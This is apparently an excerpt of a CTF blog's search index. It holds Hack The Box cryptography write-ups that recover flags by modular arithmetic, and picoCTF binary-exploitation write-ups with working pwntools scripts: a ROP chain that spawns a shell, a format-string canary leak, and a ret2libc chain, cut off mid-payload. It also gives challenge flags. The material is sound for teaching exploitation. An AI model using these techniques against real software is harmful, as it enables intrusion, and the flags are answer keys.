163924920994230253637901818188432016168244271739612329857589126113342762280179217681751572174802922903476854156324228497960403054780444742311082033470378692771947296079573091561798164949003989592245623978327019668789826246878280613414312438425787726549209707561194579292492350868953301012702750092281807657719 g = 97407673851268146184804267386115296213106535602908738837573109808033224187746927894605766365039669844761355888387043653015559933298433068597707383843814893442087063136640943475006105673619942401850890433169719970841218851182254280222787630139143746993351533776324254770080289574521452767936507196421481076841 h = 7771801879117000288817915415260102060832587957130098985489551063161695391373720317596178655146834967333192201720460001561670355858493084613455139466487717364432242890680666229302181326080340061384604634749443972114930849979067572441792867514664636574923631540074373758015873624100768698622048136552173788916 (c1, c2) = (83194887666722435308945316429939841668109985194860518882743309895332330525232854733374220834562004665371728589040849388337869965962272329974327341953512030547150987478914221697662859702721549751949905379177524490596978865458493461926865553151329446008396048857775620413257603550197735539508582063967332954541, 46980139827823872709797876525359718565495105542826335055296195898993549717497706297570900140303523646691120660896057591142474133027314700072754720423416473219145616105901315902667461002549138134613137623172629251106773324834864521095329972962212429468236356687505826351839310216384806147074454773818037349470)  Analyzing the math Let\u0026rsquo;s rewrite the encryption steps in mathematical terms:\n$$ s = h ^ y \\pmod{p} $$\n$$ c_1 = g \\cdot y \\pmod{p} $$\n$$ c_2 = m \\cdot s \\pmod{p} $$\nWe are interested in finding $m$, which is the flag. Keep in mind that we already know $p$, $g$, $h$, $c_1$ and $c_2$.\nDoing the math We can easily find $y$ using modular arithmetic:\n$$ y = c_1 \\cdot g^{-1} \\pmod{p} $$\nWith this value, we have $s = h ^ y \\pmod{p}$. Therefore, we can find $m$:\n$$ m = c_2 \\cdot s^{-1} \\pmod{p} $$\nFlag All of the above computations can be done in Python. At the end, we only need to parse $m$ as bytes:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; p = 163924920994230253637901818188432016168244271739612329857589126113342762280179217681751572174802922903476854156324228497960403054780444742311082033470378692771947296079573091561798164949003989592245623978327019668789826246878280613414312438425787726549209707561194579292492350868953301012702750092281807657719 \u0026gt;\u0026gt;\u0026gt; g = 97407673851268146184804267386115296213106535602908738837573109808033224187746927894605766365039669844761355888387043653015559933298433068597707383843814893442087063136640943475006105673619942401850890433169719970841218851182254280222787630139143746993351533776324254770080289574521452767936507196421481076841 \u0026gt;\u0026gt;\u0026gt; h = 7771801879117000288817915415260102060832587957130098985489551063161695391373720317596178655146834967333192201720460001561670355858493084613455139466487717364432242890680666229302181326080340061384604634749443972114930849979067572441792867514664636574923631540074373758015873624100768698622048136552173788916 \u0026gt;\u0026gt;\u0026gt; (c1, c2) = (83194887666722435308945316429939841668109985194860518882743309895332330525232854733374220834562004665371728589040849388337869965962272329974327341953512030547150987478914221697662859702721549751949905379177524490596978865458493461926865553151329446008396048857775620413257603550197735539508582063967332954541, 46980139827823872709797876525359718565495105542826335055296195898993549717497706297570900140303523646691120660896057591142474133027314700072754720423416473219145616105901315902667461002549138134613137623172629251106773324834864521095329972962212429468236356687505826351839310216384806147074454773818037349470) \u0026gt;\u0026gt;\u0026gt; y = c1 * pow(g, -1, p) % p \u0026gt;\u0026gt;\u0026gt; s = pow(h, y, p) \u0026gt;\u0026gt;\u0026gt; m = c2 * pow(s, -1, p) % p \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'HTB{7h3_mu171p11c471v3_920up_15_4_d4n9320u5_p14c3_70_83}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/gonna-lift-em-all/","section":"ctf","summary":"Modular arithmetic","time":2,"title":"Gonna-Lift-Em-All"},{"contents":"We got the Python source code used to encrypt the flag:\nfromCrypto.Util.numberimportbytes_to_long, getPrime importrandom FLAG=b'HTB{??????????????????????????????????????????????????????????????????????}' defgen_params(): p=getPrime(1024) g=random.randint(2, p-2) x=random.randint(2, p-2) h=pow(g, x, p) return(p, g, h), x defencrypt(pubkey): p, g, h=pubkey m=bytes_to_long(FLAG) y=random.randint(2, p-2) s=pow(h, y, p) return(g*y%p, m*s%p) defmain(): pubkey, privkey=gen_params() c1, c2=encrypt(pubkey) withopen('data.txt', 'w') asf: f.write(f'p = {pubkey[0]}\\ng = {pubkey[1]}\\nh = {pubkey[2]}\\n(c1, c2) = ({c1}, {c2})\\n') if__name__==\"__main__\": main()  We also have the output of the script:\np = 163096280281091423983210248406915712517889481034858950909290409636473708049935881617682030048346215988640991054059665720267702269812372029514413149200077540372286640767440712609200928109053348791072129620291461211782445376287196340880230151621619967077864403170491990385250500736122995129377670743204192511487 g = 90013867415033815546788865683138787340981114779795027049849106735163065530238112558925433950669257882773719245540328122774485318132233380232659378189294454934415433502907419484904868579770055146403383222584313613545633012035801235443658074554570316320175379613006002500159040573384221472749392328180810282909 h = 36126929766421201592898598390796462047092189488294899467611358820068759559145016809953567417997852926385712060056759236355651329519671229503584054092862591820977252929713375230785797177168714290835111838057125364932429350418633983021165325131930984126892231131770259051468531005183584452954169653119524751729 (c1, c2) = (159888401067473505158228981260048538206997685715926404215585294103028971525122709370069002987651820789915955483297339998284909198539884370216675928669717336010990834572641551913464452325312178797916891874885912285079465823124506696494765212303264868663818171793272450116611177713890102083844049242593904824396, 119922107693874734193003422004373653093552019951764644568950336416836757753914623024010126542723403161511430245803749782677240741425557896253881748212849840746908130439957915793292025688133503007044034712413879714604088691748282035315237472061427142978538459398404960344186573668737856258157623070654311038584)  Analyzing the math Let\u0026rsquo;s rewrite the encryption steps in mathematical terms:\n$$ s = h ^ y \\pmod{p} $$\n$$ c_1 = g \\cdot y \\pmod{p} $$\n$$ c_2 = m \\cdot s \\pmod{p} $$\nWe are interested in finding $m$, which is the flag. Keep in mind that we already know $p$, $g$, $h$, $c_1$ and $c_2$.\nDoing the math We can easily find $y$ using modular arithmetic:\n$$ y = c_1 \\cdot g^{-1} \\pmod{p} $$\nWith this value, we have $s = h ^ y \\pmod{p}$. Therefore, we can find $m$:\n$$ m = c_2 \\cdot s^{-1} \\pmod{p} $$\nFlag All of the above computations can be done in Python. At the end, we only need to parse $m$ as bytes:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; p = 163096280281091423983210248406915712517889481034858950909290409636473708049935881617682030048346215988640991054059665720267702269812372029514413149200077540372286640767440712609200928109053348791072129620291461211782445376287196340880230151621619967077864403170491990385250500736122995129377670743204192511487 \u0026gt;\u0026gt;\u0026gt; g = 90013867415033815546788865683138787340981114779795027049849106735163065530238112558925433950669257882773719245540328122774485318132233380232659378189294454934415433502907419484904868579770055146403383222584313613545633012035801235443658074554570316320175379613006002500159040573384221472749392328180810282909 \u0026gt;\u0026gt;\u0026gt; h = 36126929766421201592898598390796462047092189488294899467611358820068759559145016809953567417997852926385712060056759236355651329519671229503584054092862591820977252929713375230785797177168714290835111838057125364932429350418633983021165325131930984126892231131770259051468531005183584452954169653119524751729 \u0026gt;\u0026gt;\u0026gt; (c1, c2) = (159888401067473505158228981260048538206997685715926404215585294103028971525122709370069002987651820789915955483297339998284909198539884370216675928669717336010990834572641551913464452325312178797916891874885912285079465823124506696494765212303264868663818171793272450116611177713890102083844049242593904824396, 119922107693874734193003422004373653093552019951764644568950336416836757753914623024010126542723403161511430245803749782677240741425557896253881748212849840746908130439957915793292025688133503007044034712413879714604088691748282035315237472061427142978538459398404960344186573668737856258157623070654311038584) \u0026gt;\u0026gt;\u0026gt; y = c1 * pow(g, -1, p) % p \u0026gt;\u0026gt;\u0026gt; s = pow(h, y, p) \u0026gt;\u0026gt;\u0026gt; m = c2 * pow(s, -1, p) % p \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'HTB{b3_c4r3ful_wh3n_1mpl3m3n71n6_cryp705y573m5_1n_7h3_mul71pl1c471v3_6r0up}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/gonna-lift-them-all/","section":"ctf","summary":"Modular arithmetic","time":2,"title":"Gonna-Lift-Them-All"},{"contents":"We are given a 64-bit static binary called vuln:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Static code analysis We also have the C source code. Basically, what the program does is request a number, compare it with a random one and if it is the same, then request a username to print a message:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #define BUFSIZE 100 long increment(long in) { return in + 1; } long get_random() { return rand() % BUFSIZE; } int do_stuff() { long ans = get_random(); ans = increment(ans); int res = 0; printf(\"What number would you like to guess?\\n\"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf(\"That's not a valid number!\\n\"); } else { if (g == ans) { printf(\"Congrats! You win! Your prize is this print statement!\\n\\n\"); res = 1; } else { printf(\"Nope!\\n\\n\"); } } return res; } void win() { char winner[BUFSIZE]; printf(\"New winner!\\nName? \"); fgets(winner, 360, stdin); printf(\"Congrats %s\\n\\n\", winner); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf(\"Welcome to my guessing game!\\n\\n\"); while (1) { res = do_stuff(); if (res) { win(); } } return 0; }  First of all, we notice that the get_random function is calling rand and computing the remainder when dividing by 100 (BUFSIZE). Since the seed is the same when the process starts, we can perform a trial-error procedure until we obtain the correct number (iterating from 0 to 99).\nOnce having that value, we get access to the win function:\nvoid win() { char winner[BUFSIZE]; printf(\"New winner!\\nName? \"); fgets(winner, 360, stdin); printf(\"Congrats %s\\n\\n\", winner); }  Buffer Overflow vulnerability Despite using fgets, this function is vulnerable to Buffer Overflow because variable winner has been assigned a 100-length buffer (BUFSIZE) and we are reading 360 bytes from standard input, so we can write outside the reserved buffer.\nWe must recall the protections of the binary:\n It has NX enabled, so we cannot execute custom shellcode on the stack It has a stack canary, so there is be a random value placed before $rip that will be validated before every return instruction to prevent that $rip is overwritten. If the value of the canary is modified, then the program exits; otherwise, the program continues  Nevertheless, the canary will not affect this time. Although the output of checksec showed that a stack canary was found, the provided Makefile tells to compile the source code without canary:\nall: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln  Since NX is enabled, we need to use ROP (Return Oriented Programming). This technique takes addresses within the binary that contain instructions (gadgets) that end in ret. As a result, we can concatenate a list of gadgets so that they are executed one by one (ROP chain). This is the way to bypass NX, because we are executing instructions located in the binary, not in the stack.\nExploit development Let\u0026rsquo;s begin performing a brute force attack over the number. Notice that the binary is static, so the rand function will give always the same value at the first time.\nGuessing the number We can create a simple Python script using pwntools to start the process, enter a number and close the process if the number is not correct:\n#!/usr/bin/env python3 from pwn import * context.binary = ELF('vuln', checksec=False) elf = context.binary number = 0 number_progress = log.progress('Guessing number') for i in range(1, 101): number_progress.status(str(i)) with context.local(log_level='CRITICAL'): p = elf.process() p.sendlineafter(b'What number would you like to guess?\\n', str(i).encode()) if b'Congrats!' in p.recvline(): number = i break p.close() if number == 0: log.critical('Failed to guess number') log.success(f'Guessed number: {number}') p.close()  After running the script, we get that the number is 84:\n$ python3 solve.py [.] Guessing number: 84 [+] Guessed number: 84 [*] Stopped process './vuln' (pid 361991)  Buffer Overflow exploitation Now we can use GDB to figure out the offset to overwrite $rsp using a pattern string:\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ pattern create 500 [+] Generating a pattern of 500 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa [+] Saved as '$_gef1' gef➤ run Starting program: ./vuln Welcome to my guessing game! What number would you like to guess? 84 Congrats! You win! Your prize is this print statement! New winner! Name? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaa taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaa aboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaa aaacjaaaaaackaaaaaaclaaaaaacmaaa Congrats aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaa aaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaa aaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaa Program received signal SIGSEGV, Segmentation fault. 0x0000000000400c8b in win ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 120 (little-endian search) likely [+] Found at offset 113 (big-endian search)  Alright. Now we can start building the ROP chain. Since it is a static binary, we need to perform a syscall to execute execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL);. For that purpose, we need:\n $rax to have a value of 0x3b $rdi to have a pointer to the string \u0026quot;/bin/sh\u0026quot; $rsi to have a value of 0 (NULL) $rdx to have a value of 0 (NULL)  We can use ROPgadget to find gadgets of the form pop \u0026lt;register\u0026gt; ; ret and the syscall:\n$ ROPgadget --binary vuln | grep ': pop r[ads][ix] ; ret$' 0x00000000004163f4 : pop rax ; ret 0x0000000000400696 : pop rdi ; ret 0x000000000044a6b5 : pop rdx ; ret 0x0000000000410ca3 : pop rsi ; ret $ ROPgadget --binary vuln | grep ': syscall$' 0x000000000040137c : syscall  Now we need to find a writable memory space, such as .bss, to write the string \u0026quot;/bin/sh\u0026quot;. The address of .bss can be obtained with readelf:\n$ readelf -S vuln | grep '\\.bss' [26] .bss NOBITS 00000000006bc3a0 000bc398  The last gadget we need is one to store \u0026quot;/bin/sh\u0026quot; to the address of bss. We need an instruction of the form mov qword ptr [\u0026lt;register\u0026gt;], \u0026lt;register\u0026gt; ; ret. Anyone of these will be useful:\n$ ROPgadget --binary vuln | grep ': mov .word ptr \\[r..\\], r.. ; ret$' 0x000000000048dd71 : mov qword ptr [rax], rdx ; ret 0x000000000043608b : mov qword ptr [rdi], rcx ; ret 0x0000000000436393 : mov qword ptr [rdi], rdx ; ret 0x0000000000447d7b : mov qword ptr [rdi], rsi ; ret 0x0000000000419127 : mov qword ptr [rdx], rax ; ret 0x000000000047ff91 : mov qword ptr [rsi], rax ; ret  I decided to use mov qword ptr [rdx], rax ; ret. Now, let\u0026rsquo;s build the ROP chain in the Python exploit and send it:\nbss = 0x6bc3a0 pop_rdi_ret = 0x400696 pop_rsi_ret = 0x410ca3 pop_rdx_ret = 0x44a6b5 pop_rax_ret = 0x4163f4 mov_qword_ptr_rdx_rax_ret = 0x419127 syscall = 0x40137c offset = 120 junk = b'A' * offset payload = junk payload += p64(pop_rdx_ret) # $rdx = .bss payload += p64(bss) payload += p64(pop_rax_ret) # $rax = \"/bin/sh\" payload += b'/bin/sh\\0' payload += p64(mov_qword_ptr_rdx_rax_ret) # Store \"/bin/sh\" in .bss payload += p64(pop_rax_ret) # $rax = 0x3b payload += p64(0x3b) payload += p64(pop_rdi_ret) # $rdi = .bss (pointer to \"/bin/sh\") payload += p64(bss) payload += p64(pop_rsi_ret) # $rsi = 0 payload += p64(0) payload += p64(pop_rdx_ret) # $rdx = 0 payload += p64(0) payload += p64(syscall) p.sendlineafter(b'Name?', payload) p.recvline() p.recvline()  If we run it locally, we will have a shell:\n$ python3 solve.py [┤] Guessing number: 84 [+] Guessed number: 84 [*] Switching to interactive mode $ ls Makefile solve.py vuln vuln.c  Flag Perfect, now let\u0026rsquo;s run it on the remote instance:\n$ python3 solve.py jupiter.challenges.picoctf.org 50581 [┤] Guessing number: 84 [+] Guessed number: 84 [*] Switching to interactive mode $ ls flag.txt vuln vuln.c xinet_startup.sh $ cat flag.txt picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_1ed68bc5575f6be1}  The full exploit can be found in here: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/","section":"ctf","summary":"picoCTF 2020 Mini-Competition. 250 points. 64-bit static binary. Buffer Overflow. ROP chain","time":6,"title":"Guessing Game 1"},{"contents":"We are given a 32-bit binary called vuln:\nArch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  Static code analysis We also have the C source code. Basically, what the program does is request a number, compare it with a random one and if it is the same, then request a username to print a message:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } int do_stuff() { long ans = (get_random() % 4096) + 1; int res = 0; printf(\"What number would you like to guess?\\n\"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf(\"That's not a valid number!\\n\"); } else { if (g == ans) { printf(\"Congrats! You win! Your prize is this print statement!\\n\\n\"); res = 1; } else { printf(\"Nope!\\n\\n\"); } } return res; } void win() { char winner[BUFSIZE]; printf(\"New winner!\\nName? \"); gets(winner); printf(\"Congrats: \"); printf(winner); printf(\"\\n\\n\"); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf(\"Welcome to my guessing game!\\n\"); printf(\"Version: %x\\n\\n\", get_version()); while (1) { res = do_stuff(); if (res) { win(); } } return 0; }  The code is pretty similar to the one on challenge Guessing Game 1 (take a look at that challenge before continuing).\nGuessing the number The get_random function is a bit different. This time it is taking a fix value, but we do not know yet its value. However, it can be shown in GDB:\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ disassemble do_stuff Dump of assembler code for function do_stuff: ... 0x080486e9 : call 0x80484e0 atol@plt 0x080486ee : add esp,0x10 0x080486f1 : mov DWORD PTR [ebp-0x210],eax 0x080486f7 : cmp DWORD PTR [ebp-0x210],0x0 0x080486fe : jne 0x8048714 do_stuff+181 0x08048700 : sub esp,0xc 0x08048703 : lea eax,[ebx-0x1657] 0x08048709 : push eax 0x0804870a : call 0x80484c0 puts@plt 0x0804870f : add esp,0x10 0x08048712 : jmp 0x8048752 do_stuff+243 0x08048714 : mov eax,DWORD PTR [ebp-0x210] 0x0804871a : cmp eax,DWORD PTR [ebp-0x214] 0x08048720 : jne 0x8048740 do_stuff+225 ... End of assembler dump.  The comparison is at the address 0x0804871a, where it compares $eax to what it is stored in $ebp - 0x214. Let\u0026rsquo;s put a breakpoint and run the program:\ngef➤ break *0x0804871a Breakpoint 1 at 0x804871a gef➤ run Starting program: ./vuln Welcome to my guessing game! Version: 2 What number would you like to guess? 1 Breakpoint 1, 0x0804871a in do_stuff ()  Perfect, let\u0026rsquo;s examine the contents of address $ebp - 0x214:\ngef➤ x $ebp-0x214 0xffffd5f4: 0xfffff2a1  Here we need to take into account that 0xfffff2a1 is a negative number, because the most significant bit is 1. Hence, we need to compute the two\u0026rsquo;s complement (negate the number and add 1), which is -3423:\nnumber = - ((~0xfffff2a1 \u0026amp; 0xffffffff) + 1) # -3423  We can try it:\n$ ./vuln Welcome to my guessing game! Version: 2 What number would you like to guess? -3423 Congrats! You win! Your prize is this print statement! New winner! Name?  Now we arrive to the win function:\nvoid win() { char winner[BUFSIZE]; printf(\"New winner!\\nName? \"); gets(winner); printf(\"Congrats: \"); printf(winner); printf(\"\\n\\n\"); }  Vulnerabilities This time we have a call to gets (which is vulnerable to Buffer Overflow), and also a Format String vulnerability, since variable winner is inserted as the first argument of printf.\nBasically, we can dump values of the stack:\n$ ./vuln Welcome to my guessing game! Version: 2 What number would you like to guess? -3423 Congrats! You win! Your prize is this print statement! New winner! Name? %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x. Congrats: 200.f7fae580.804877d.1.fffff2a1.fffff2a1.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.f7ff7500. What number would you like to guess?  The Format String vulnerability will be useful to obtain the value of the stack canary (this time there is an stack canary, and not like in Guessing Game 1). In order to exploit the Buffer Overflow with gets we need to add the value of the canary before $eip to bypass the protection (otherwise, the canary will be modified and the program just terminates).\nLet\u0026rsquo;s use a Python script to guess the position of the canary in the stack. The idea is to dump positions of the stack until we find one value that has the form of a stack canary (ends with a NULL byte, 00 in hexadecimal digits):\n#!/usr/bin/env python3 from pwn import * elf = ELF('vuln', checksec=False) context.binary = elf number = -3423 # - ((~0xfffff2a1 \u0026amp; 0xffffffff) + 1) log.success(f'Guessed number: {number}') p = process(elf.path) def dump(n: int) -\u0026gt; str: p.sendlineafter(b'What number would you like to guess?\\n', str(number).encode()) p.sendlineafter(b'Name? ', f'%{n}$x'.encode()) res = p.recvline().decode().strip() res = res.lstrip('Congrats: ') return res for i in range(200): res = dump(i) if res.endswith('00'): print(i, dump(i)) p.close()  Basically we are extracting values at certain positions using a formats strings like %1$x, %2$x, %3$x and so on. If we try with the first 200 positions and select the canary candidates (the ones that end in 00), we have that the canary is likely to be in position 119 (actually repeated in position 135):\n$ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 64957 1 200 23 f7f22100 31 f7f55000 95 f7f0c000 119 b45b6d00 124 f7f0c000 125 f7f0c000 132 f7f0c000 133 f7f0c000 135 b45b6d00 148 f7f0c000 149 f7f0c000 156 f7f0c000 157 f7f55000 162 f7f0c000 163 f7f0c000 184 8048900 [*] Stopped process './vuln' (pid 64957)  Let\u0026rsquo;s test it with GDB:\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ break main Breakpoint 1 at 0x804880e gef➤ run Starting program: ./vuln Breakpoint 1, 0x804880e in main ()  gef➤ canary [+] Found AT_RANDOM at 0xffffda2b, reading 4 bytes [+] The canary of process 71318 is 0x3ce1fa00 gef➤ continue Continuing. Welcome to my guessing game! Version: 2 What number would you like to guess? -3423 Congrats! You win! Your prize is this print statement! New winner! Name? %119$x Congrats: 3ce1fa00 What number would you like to guess?  Exploit development Alright, now we can start exploiting the Buffer Overflow. First of all, we need to obtain the number of bytes needed to overwrite $eip. This can be done in multiple ways because we have a stack canary. For the moment, let\u0026rsquo;s send payloads and increase their size until the process stops:\ncanary_position = 119 canary = int(dump(canary_position), 16) log.success(f'Leaked canary: {hex(canary)}') def send_payload(payload: bytes) -\u0026gt; bytes: p.sendlineafter(b'What number would you like to guess?\\n', str(number).encode()) p.sendlineafter(b'Name? ', payload) return p.recvline() for i in range(250): try: send_payload(b'A' * 4 * i) except EOFError: log.info(f'Stack smashing detected with {4 * i - 4} bytes') break p.close()  $ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 83225 [+] Leaked canary: 0x330c2500 [*] Stack smashing detected with 516 bytes [*] Process './vuln' stopped with exit code -6 (SIGABRT) (pid 83225)  So the stack smashing is detected when we send 516 bytes. Hence, to reach the stack canary we need 512 bytes.\nNotice that the stack smashing is detected in the previous iteration to the one that gave EOFError (which means that the process is no longer alive).\nNow, let\u0026rsquo;s add the canary in our payload and then send a pattern string using cyclic from pwntools. After that, we can attach GDB to the process and calculate the offset to $eip:\ndef send_payload(payload: bytes) -\u0026gt; bytes: p.sendlineafter(b'What number would you like to guess?\\n', str(number).encode()) p.sendlineafter(b'Name? ', payload) return p.recvline() offset = 512 junk = b'A' * offset payload = junk payload += p32(canary) payload += cyclic(500) gdb.attach(p, gdbscript='continue') send_payload(payload) p.interactive()  Program received signal SIGSEGV, Segmentation fault. 0x61616164 in ?? ()  The $eip register is overwritten with 0x61616164 (daaa), which is at offset 12:\n$ pwn cyclic -l 0x61616164 12  Now, we need to create a ROP chain to perform a Ret2Libc attack, since the binary is dynamically linked:\n$ ldd vuln linux-gate.so.1 (0xf7efb000) libc.so.6 = /lib32/libc.so.6 (0xf7cf9000) /lib/ld-linux.so.2 (0xf7efd000)  Leaking memory addresses Since we do not know which version of Glibc is running in the remote instance, we must leak an address of a function inside Glibc to look up the offset in a Glibc database.\nTo do the leak, we can call puts in the PLT and leak the contents of an address of GOT, for example the same puts. The return address will be the address of win.\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ p puts $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x80484c0 puts@plt gef➤ p win $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x804876e win gef➤ quit $ readelf -a vuln | grep puts 08049fdc 00000607 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 6: 00000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.0 (2) 55: 00000000 0 FUNC GLOBAL DEFAULT UND puts@@GLIBC_2.0  So this is the ROP chain:\noffset_to_canary = 512 offset_to_eip = 12 junk_to_canary = b'A' * offset_to_canary junk_to_eip = b'A' * offset_to_eip payload = junk_to_canary payload += p32(canary) payload += junk_to_eip win_addr = 0x0804876e puts_plt = 0x080484c0 puts_got = 0x08049fdc payload += p32(puts_plt) payload += p32(win_addr) payload += p32(puts_got) send_payload(payload)  After that, we will receive the real address of puts inside Glibc (which is 4 bytes long):\np.recvline() puts_addr = u32(p.recvline()[:4].ljust(4, b'\\0')) log.success(f'Leaked puts() address: {hex(puts_addr)}')  We have this leaked value:\n$ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 148404 [+] Leaked canary: 0x3463de00 [+] Leaked puts() address: 0xf7d73290 [*] Switching to interactive mode New winner! Name? $  Notice as well that win is being called. To check if the leaked address is correct, we can obtain the offset of puts inside Glibc (the local one, for the remote instance later):\n$ readelf -s /lib32/libc.so.6 | grep puts 215: 00071290 531 FUNC GLOBAL DEFAULT 16 _IO_puts@@GLIBC_2.0 461: 00071290 531 FUNC WEAK DEFAULT 16 puts@@GLIBC_2.0 540: 0010c050 1240 FUNC GLOBAL DEFAULT 16 putspent@@GLIBC_2.0 737: 0010dc90 742 FUNC GLOBAL DEFAULT 16 putsgent@@GLIBC_2.10 1244: 0006fa20 381 FUNC WEAK DEFAULT 16 fputs@@GLIBC_2.0 1831: 0006fa20 381 FUNC GLOBAL DEFAULT 16 _IO_fputs@@GLIBC_2.0 2507: 0007ac20 191 FUNC WEAK DEFAULT 16 fputs_unlocked@@GLIBC_2.1  The offset is 0x71290, and the leaked address was 0xf7d73290. Both numbers end with 290 in hexadecimal, so everything is alright. The base address of Glibc is randomized because of ASLR, but we know that this address will end in 000 in hexadecimal, so the real address of puts must end with the last three hexadecimal digits of its offset (290).\nTo compute the base address of Glibc, we can do a simple substraction:\np.recvline() puts_addr = u32(p.recvline()[:4].ljust(4, b'\\0')) log.success(f'Leaked puts() address: {hex(puts_addr)}') puts_offset = 0x71290 glibc_base_addr = puts_addr - puts_offset log.success(f'Glibc base address: {hex(glibc_base_addr)}')  $ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 154121 [+] Leaked canary: 0xf0f7ba00 [+] Leaked puts() address: 0xf7d9d290 [+] Glibc base address: 0xf7d2c000 [*] Switching to interactive mode New winner! Name? $  Ret2Libc attack Now we are able to perform a Ret2Libc attack. Basically, we must call system inside Glibc and use \u0026quot;/bin/sh\u0026quot; as an argument. The string \u0026quot;/bin/sh\u0026quot; is also inside Glibc:\n$ readelf -s /lib32/libc.so.6 | grep system 258: 00137810 106 FUNC GLOBAL DEFAULT 16 svcerr_systemerr@@GLIBC_2.0 662: 00045420 63 FUNC GLOBAL DEFAULT 16 __libc_system@@GLIBC_PRIVATE 1534: 00045420 63 FUNC WEAK DEFAULT 16 system@@GLIBC_2.0 $ strings -atx /lib32/libc.so.6 | grep /bin/sh 18f352 /bin/sh  This is the second ROP chain:\npayload = junk_to_canary payload += p32(canary) payload += junk_to_eip system_offset = 0x45420 bin_sh_offset = 0x18f352 system_addr = glibc_base_addr + system_offset bin_sh_addr = glibc_base_addr + bin_sh_offset payload += p32(system_addr) payload += p32(win_addr) payload += 